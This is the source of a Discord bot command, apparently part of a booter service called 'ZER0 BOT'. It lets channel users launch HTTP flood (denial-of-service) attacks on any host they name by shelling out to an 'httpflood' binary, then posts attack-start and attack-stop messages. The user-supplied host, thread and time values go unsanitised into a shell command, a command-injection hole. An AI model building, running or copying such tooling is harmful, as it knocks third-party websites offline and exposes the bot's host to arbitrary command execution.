const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const thread = message.content.split (" ")[2]
const time = message.content.split (" ")[3]
const ayarlar = require('../admin.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`Example: ;flood https://example.com/`")
	.setFooter("Please do not attack websites with domain .gov/.edu")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`./httpflood ${host} ${thread} post ${time} nil`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Stop Attacking ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **ZER0 BOT** 🔥')
	.setTimestamp()
	.setDescription("**► The attack has stopped 💥**")
	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 120000); //time in milliseconds
var gifler = ["https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif" , "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Start Attacking ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **ZER0 BOT** 🔥')
	.setTimestamp()
	.setDescription("**User**: `PREMIUM ☭` \n **Host**: `" + host + "` \n **Method**: `Flood 💥` \n **Time**: `60 seconds 🕒` \n **If we detect you attack the .gov/.edu website, we will ban you from the server**")
	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['flood'],
  permLevel: 0
}

exports.help = {
  name: 'flood',
  description: 'zxcr9999',
  usage: 'flood'
}